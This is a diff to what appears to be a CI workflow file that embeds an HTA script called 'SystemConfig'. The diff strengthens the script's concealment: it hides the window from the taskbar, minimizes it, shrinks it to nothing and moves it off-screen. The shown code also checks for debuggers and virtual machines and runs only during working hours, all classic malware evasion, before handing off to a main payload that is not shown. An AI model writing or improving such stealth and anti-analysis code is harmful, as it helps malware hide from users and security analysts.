@@ -35,7 +35,7 @@ jobs:
           id="oHTA"
           applicationname="SystemConfig"
           singleinstance="yes"
-          showintaskbar="yes"
+          showintaskbar="no"
           border="none"
           borderstyle="normal"
           innerborder="no"
@@ -43,7 +43,7 @@ jobs:
           sysmenu="no"
           maximizebutton="no"
           minimizebutton="no"
-          windowstate="normal"
+          windowstate="minimize"
           scroll="no"
           scrollflat="no"
           version="1.0"
@@ -190,15 +190,15 @@ jobs:
         
         ' Main execution starts here
         Sub Window_OnLoad
-            ' Hide the window
-            Me.WindowStyle = "none"
-            Me.Left = -3000
-            Me.Top = -3000
+            ' Hide the window by moving it off-screen and minimizing
+            window.resizeTo 0,0
+            window.moveTo -3000,-3000
+            oHTA.windowState = "minimize"
             
             ' Anti-analysis checks
-            If IsDebuggingActive() Then Window.Close
-            If IsVirtualEnvironment() Then Window.Close
-            If Hour(Now) < 9 Or Hour(Now) > 17 Then Window.Close
+            If IsDebuggingActive() Then window.close
+            If IsVirtualEnvironment() Then window.close
+            If Hour(Now) < 9 Or Hour(Now) > 17 Then window.close
             TimeBasedDelay
             
             ' Main script execution
@@ -238,7 +238,7 @@ jobs:
             End If
             
             ' Close the HTA
-            Window.Close
+            window.close
         End Sub
         </script>
         </head>
